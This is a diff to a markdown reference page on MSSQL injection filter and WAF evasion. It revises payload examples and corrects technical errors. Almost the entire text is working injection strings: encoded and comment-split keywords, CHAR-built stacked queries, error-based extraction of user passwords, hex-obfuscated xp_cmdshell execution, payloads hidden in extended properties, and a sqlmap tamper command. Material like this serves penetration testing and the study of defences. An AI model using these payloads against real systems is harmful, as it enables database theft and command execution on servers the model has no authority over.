@@ -4,25 +4,22 @@ description: Techniques for bypassing defenses in MSSQL injection
 category: Advanced Techniques
 order: 16
 tags: ["obfuscation", "WAF bypass", "filter evasion"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 Modern web applications often implement security measures like Web Application Firewalls (WAFs) and input filters to prevent SQL injection. Fuzzing and obfuscation techniques can help bypass these protections by disguising malicious SQL commands in ways that security tools may miss but the database will still execute.
 
 ## Comment Variations
 
-SQL Server supports various comment styles that can be used to break up SQL keywords:
+Block comments can replace whitespace between tokens. They cannot split a keyword: `UN/**/ION` is two identifiers, not `UNION`.
 
 ```sql
--- Standard SQL comments
+-- Block comments as token separators
 SELECT/*comment*/username,password/**/FROM/**/users
 
--- Single-line comment requires a space
-SELECT -- comment
+-- A line comment ends at the newline (no space needed after --)
+SELECT --comment
 username FROM users WHERE id = 1
-
--- Line continuation with CHAR(10) as newline
-SELECT CHAR(10) username FROM users
 ```
 
 ## Whitespace Manipulation
@@ -36,18 +33,15 @@ username
 FROM
 users
 
--- Unicode whitespace characters (not all supported in SQL Server)
-SELECT%A0username%A0FROM%A0users
-
 -- Excessive whitespace
 SELECT       username       FROM       users
 ```
 
-## IIS/ASP Specific Obfuscation
+## Classic ASP Specific Obfuscation
 
-In ASP(x) applications, percentage signs can be placed between characters to bypass filters, as IIS strips them before passing the query to the database:
+In classic ASP, the `Request` object drops a `%` that does not start a valid escape sequence, so percent signs can be placed between characters to slip past filters that inspect the raw request. This is a property of classic ASP request decoding, not of ASP.NET or SQL Server:
 
-```sql
+```text
 -- "SELECT" with % signs
 S%E%L%E%C%T column FROM table
 
@@ -57,10 +51,11 @@ A%%ND 1=%%%%%%%%1
 
 ## Allowed Intermediary Characters (Whitespace)
 
-The following characters can be used instead of spaces:
+SQL Server treats every character from `0x00` to `0x20` as whitespace, so any of them can replace a space (verified on SQL Server 2017, 2019 and 2022, which also accept `NCHAR(133)` and `NCHAR(160)`). `%00` only works when the application passes the null byte through (see [Comment Out Query](/mssql/comment-out-query)). In Unicode query text, `NCHAR(160)` (no-break space, `%C2%A0` in UTF-8) and `NCHAR(133)` (next line) are whitespace as well.
 
 | Hex   | Description          |
 | ----- | -------------------- |
+| `%00` | Null                 |
 | `%01` | Start of Heading     |
 | `%02` | Start of Text        |
 | `%03` | End of Text          |
@@ -94,36 +89,36 @@ The following characters can be used instead of spaces:
 | `%1F` | Unit Separator       |
 | `%20` | Space                |
 
-**Note:** `%25` (percent sign) is not whitespace but can be used for obfuscation in IIS/ASP environments (see IIS/ASP Specific Obfuscation section above).
+**Note:** `%25` (percent sign) is not whitespace but can be used for obfuscation in classic ASP applications (see the section above).
 
 ## Characters Avoiding Spaces
 
 These characters can replace spaces in certain contexts:
 
-| Character | Description  | Example                                                |
-| --------- | ------------ | ------------------------------------------------------ |
-| `"`       | Double quote | `SELECT"column"FROM"table"`                            |
-| `(` `)`   | Parentheses  | `UNION(SELECT(column)FROM(table))`                     |
-| `[` `]`   | Brackets     | `SELECT[column_name]FROM[information_schema].[tables]` |
+| Character | Description  | Example                                                                          |
+| --------- | ------------ | -------------------------------------------------------------------------------- |
+| `"`       | Double quote | `SELECT"username"FROM"users"` (needs `QUOTED_IDENTIFIER ON`, the driver default) |
+| `(` `)`   | Parentheses  | `UNION(SELECT(username)FROM users)` (a table name cannot be parenthesized)       |
+| `[` `]`   | Brackets     | `SELECT[table_name]FROM[information_schema].[tables]`                            |
+
+With `SET QUOTED_IDENTIFIER OFF`, which some older applications and drivers use, double quotes delimit string literals instead (`SELECT "it's"` returns `it's`), so a value placed inside `"..."` is broken out of with `"` rather than `'`.
 
 ## Characters After AND/OR
 
-The following characters can appear immediately after AND/OR:
+Besides the whitespace characters above, these characters can appear immediately after AND/OR (they start a numeric expression):
 
-| Hex       | Character | Description   |
-| --------- | --------- | ------------- |
-| `%01-%20` | Various   | Control chars |
-| `%21`     | `!`       | Exclamation   |
-| `%2B`     | `+`       | Plus          |
-| `%2D`     | `-`       | Minus         |
-| `%2E`     | `.`       | Period        |
-| `%5C`     | `\`       | Backslash     |
-| `%7E`     | `~`       | Tilde         |
+| Hex   | Character | Description |
+| ----- | --------- | ----------- |
+| `%2B` | `+`       | Plus        |
+| `%2D` | `-`       | Minus       |
+| `%2E` | `.`       | Period      |
+| `%5C` | `\`       | Backslash   |
+| `%7E` | `~`       | Tilde       |
 
-Example (`\` denotes a space character per the table above):
+Example (numeric context, no spaces):
 
 ```sql
-SELECT 1 FROM[table]WHERE\1=\1AND\1=\1
+1 AND\1=\1AND.1=.1AND-1=-1
 ```
 
 ## Case Variation
@@ -137,21 +132,16 @@ SeLeCt UsErNaMe FrOm UsErS wHeRe Id=1
 
 ## Operator Alternatives
 
-Some operators have alternative representations:
+T-SQL has no logical `||` or `&&` and no `<=>` (those are MySQL). SQL Server 2025 adds `||`, but only for string concatenation, so `1=0 || 1=1` is still a syntax error. The alternatives rewrite the comparison instead:
 
 ```sql
--- OR alternatives
-1 OR 1=1
-1 || 1=1  -- Works if ANSI_NULLS is OFF
+-- Instead of id = 1
+id IN (1)
+id BETWEEN 1 AND 1
+NOT id <> 1
 
-
--- AND alternatives
-1 AND 1=1
-1 && 1=1  -- Works if ANSI_NULLS is OFF
-
--- Equal alternatives
-id=1
-id<=>1  -- Works in some contexts
+-- Instead of OR 1=1 (string context)
+' OR 'a' LIKE 'a
 ```
 
 ## String Representation
@@ -168,8 +158,8 @@ SELECT NCHAR(97) + NCHAR(100) + NCHAR(109) + NCHAR(105) + NCHAR(110) -- N'admin'
 -- Using concatenation
 SELECT 'ad' + 'min'
 
--- Hex representation (SQL Server 2005+)
-SELECT 0x61646D696E -- 'admin'
+-- Hex literal: a varbinary value, so CAST it to varchar before comparing to text
+SELECT CAST(0x61646D696E AS varchar(10)) -- 'admin'
 
 -- String literals with N prefix (Unicode)
 SELECT N'admin'
@@ -183,26 +173,23 @@ Numbers can be represented in various ways:
 -- Mathematical expressions
 SELECT * FROM users WHERE id = 1+0
 
--- Boolean conversions
-SELECT * FROM users WHERE id = (1=1)  -- Returns 1
-
 -- Subqueries
 SELECT * FROM users WHERE id = (SELECT 1)
 
--- Hexadecimal (0x notation)
-SELECT * FROM users WHERE id = 0x1 -- hex for 1
+-- Hexadecimal (varbinary, implicitly converted to int)
+SELECT * FROM users WHERE id = 0x1
 ```
 
-## Function Call Obfuscation
+## Keyword Obfuscation with Dynamic SQL
 
-Function names can be obfuscated using dynamic SQL:
+Keywords can be assembled at runtime and run with `EXEC()`. The built string runs as a separate batch, so this needs stacked queries and cannot extend the original query (a dynamic `UNION SELECT ...` on its own is a syntax error):
 
 ```sql
--- Using variables to build function names
+-- Using variables to build keywords
 DECLARE @f varchar(100) = 'S' + 'ELECT'
 EXEC(@f + ' * FROM users')
 
--- Using QUOTENAME (with some limitations)
+-- Using QUOTENAME to bracket an identifier
 DECLARE @t varchar(100) = QUOTENAME('users')
 EXEC('SELECT * FROM ' + @t)
 ```
@@ -212,62 +199,63 @@ EXEC('SELECT * FROM ' + @t)
 ### Using Extended Stored Procedures
 
 ```sql
--- Using xp_cmdshell indirectly
+-- Calling xp_cmdshell without its name in the payload
+-- (needs sysadmin and xp_cmdshell enabled; not available on SQL Server for Linux)
 DECLARE @x varchar(100) = 0x78705F636D647368656C6C -- hex for 'xp_cmdshell'
-EXEC('EXEC ' + @x + ' ''dir''')
+EXEC('EXEC ' + @x + ' ''whoami''')
 ```
 
 ### Using Cast and Convert
 
 ```sql
--- Using CAST to obfuscate
-SELECT * FROM users WHERE id = CAST(0x31 AS int) -- 0x31 is hex for '1'
+-- 0x31 is the character '1': casting the binary straight to int gives 49, so go through varchar
+SELECT * FROM users WHERE id = CAST(CAST(0x31 AS varchar(1)) AS int)
 
--- Using CONVERT
-SELECT * FROM users WHERE id = CONVERT(int, 0x31)
+-- 0x01 is the integer 1
+SELECT * FROM users WHERE id = CONVERT(int, 0x01)
 ```
 
 ## WAF Bypass Techniques
 
 ### Special Characters and Encodings
 
-````sql
--- URL encoding (depends on how application processes input)
+These encodings act on the HTTP layer; whether they reach SQL Server decoded depends on the web server and application:
+
+```text
+-- URL encoding (decoded once by the web server)
 SELECT%20*%20FROM%20users
 
--- Double URL encoding
+-- Double URL encoding (only if the application decodes a second time)
 SELECT%2520*%2520FROM%2520users
 
--- Unicode-wide characters
+-- %uXXXX encoding (decoded by IIS / classic ASP)
 SELECT+%u0055NION+%u0053ELECT+1,2,3--
--- XML Entity Encoding (for injection into XML contexts)
--- **Note:** This only works when injecting into XML input (SOAP APIs, XML web
--- services, etc.) where an XML parser decodes entities before SQL execution.
--- Does NOT work for regular form/query string injection.
+```
 
+XML entity encoding only works when injecting into XML input (SOAP, XML web services) where an XML parser decodes entities before the value is used in SQL; it does not work for regular form or query string parameters:
+
+```text
 -- Decimal entities (1 UNION SELECT NULL becomes):
 &#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;
 
 -- Hex entities (same payload):
 &#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;
+```
 
 #### Breaking Up Keywords
 
-```sql
--- Split with comments
-UN/**/ION SEL/**/ECT 1,2,3--
+Comments cannot split a keyword in T-SQL (`UN/**/ION` is a syntax error); split the keyword in dynamic SQL instead (stacked query):
 
--- Split with variables
-DECLARE @u varchar(10) = 'UN' + 'ION'
+```sql
 DECLARE @s varchar(10) = 'SEL' + 'ECT'
-EXEC(@u + ' ' + @s + ' 1,2,3--')
-````
+EXEC(@s + ' username FROM users')
+```
 
 #### Alternative Function Forms
 
 ```sql
--- Using DATABASE_ID instead of DB_ID
-SELECT DB_NAME(DATABASE_ID()) -- Current database
+-- DB_NAME() without an argument, or with DB_ID()
+SELECT DB_NAME(DB_ID()) -- Current database
 
 -- Using SUBSTRING instead of LEFT
 SELECT SUBSTRING(name, 1, 3) FROM sys.databases -- Same as LEFT(name, 3)
@@ -277,34 +265,30 @@ SELECT SUBSTRING(name, 1, 3) FROM sys.databases -- Same as LEFT(name, 3)
 
 #### WAF Bypass with Obfuscation
 
-```sql
--- Instead of: UNION SELECT 1,2,3
+```text
+-- Instead of: UNION SELECT 1,2,3 (URL-encoded letters; only helps if the filter does not decode)
 ' %55NION %53ELECT 1,2,3--
 
--- Instead of: OR 1=1
-' OR/**/'1'='1
-
 -- Instead of: SELECT @@version
-' %53ELECT %40%40version--
+' UNION %53ELECT %40%40version--
+```
+
+```sql
+-- Instead of: OR 1=1 (string context)
+' OR/**/'1'='1
 ```
 
 #### Bypassing Keyword Filters
 
-If 'SELECT' is blocked:
+If 'SELECT' is blocked (string context, stacked query; the application must return the result of the extra statement for it to be visible):
 
 ```sql
 -- Using character encoding
-' DECLARE @s nvarchar(100) = CHAR(83) + CHAR(69) + CHAR(76) + CHAR(69) + CHAR(67) + CHAR(84) + CHAR(32) + CHAR(42) + CHAR(32) + CHAR(70) + CHAR(82) + CHAR(79) + CHAR(77) + CHAR(32) + CHAR(117) + CHAR(115) + CHAR(101) + CHAR(114) + CHAR(115); EXEC(@s)--
+'; DECLARE @s nvarchar(100) = CHAR(83) + CHAR(69) + CHAR(76) + CHAR(69) + CHAR(67) + CHAR(84) + CHAR(32) + CHAR(42) + CHAR(32) + CHAR(70) + CHAR(82) + CHAR(79) + CHAR(77) + CHAR(32) + CHAR(117) + CHAR(115) + CHAR(101) + CHAR(114) + CHAR(115); EXEC(@s)--
 -- This builds and executes: SELECT * FROM users
 ```
 
-If 'UNION' is blocked:
-
-```sql
--- Constructing with variables
-' DECLARE @u nvarchar(100) = CHAR(85) + CHAR(78) + CHAR(73) + CHAR(79) + CHAR(78) + CHAR(32) + CHAR(83) + CHAR(69) + CHAR(76) + CHAR(69) + CHAR(67) + CHAR(84) + CHAR(32) + CHAR(49) + CHAR(44) + CHAR(50); EXEC(@u)--
--- This builds and executes: UNION SELECT 1,2
-```
+If 'UNION' is blocked, dynamic SQL cannot help, because the built string cannot be attached to the original query. Use a technique that does not need `UNION`: error-based extraction (`' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--`) or blind conditions (see [Conditional Statements](/mssql/conditional-statements)).
 
 #### Advanced Evasion Examples
 
@@ -312,8 +296,8 @@ If 'UNION' is blocked:
 -- Using dynamic SQL and EXECUTE to avoid direct detection
 '; DECLARE @q nvarchar(100); SET @q = 'SEL' + 'ECT * F' + 'ROM users'; EXEC(@q)--
 
--- Using SQL Server XML features to hide payloads
-'; WITH xmldata AS (SELECT CAST('<root><a>SELECT * FROM users</a></root>' AS XML) as xmlval) SELECT xmlval.value('/root[1]/a[1]', 'varchar(100)') FROM xmldata--
+-- Hiding the statement in an XML value and executing it
+'; DECLARE @q varchar(100) = CAST('<a>SELECT * FROM users</a>' AS XML).value('/a[1]', 'varchar(100)'); EXEC(@q)--
 ```
 
 ### Automated Fuzzing
@@ -326,26 +310,21 @@ sqlmap --url="http://target/page.php?id=1" --tamper=charencode,space2comment,ran
 
 ### MSSQL-Specific Obfuscation Techniques
 
-#### Using Built-in Variables
+#### Using Built-in Functions
 
 ```sql
--- Using built-in variables instead of literals
+-- Using built-in functions instead of literals (two-column UNION, string context)
 ' UNION SELECT DB_NAME(), USER_NAME()--
 ```
 
-#### Using Database Collation to Bypass Filters
+#### Using SQL Server's Extended Properties
 
-```sql
--- Case-sensitive collation comparison
-' UNION ALL SELECT 'SEL' + 'ECT' COLLATE Latin1_General_CS_AS--
-```
-
-#### Using SQL Server's extended properties
+A payload can be stored as an extended property and executed later. `value` is `sql_variant`, so convert it before `EXEC`. Adding the property needs `ALTER` permission on the object, and it persists until dropped with `sp_dropextendedproperty`:
 
 ```sql
 -- Hiding payload in extended properties
-EXEC sp_addextendedproperty 'payload', 'SELECT * FROM users', 'SCHEMA', 'dbo', 'TABLE', 'SomeTable';
-DECLARE @p varchar(100); SELECT @p = value FROM sys.extended_properties WHERE name = 'payload'; EXEC(@p);
+EXEC sp_addextendedproperty 'payload', 'SELECT * FROM users', 'SCHEMA', 'dbo', 'TABLE', 'users';
+DECLARE @p nvarchar(4000); SELECT @p = CONVERT(nvarchar(4000), value) FROM sys.extended_properties WHERE name = 'payload'; EXEC(@p);
 ```
 
 ### Mitigations
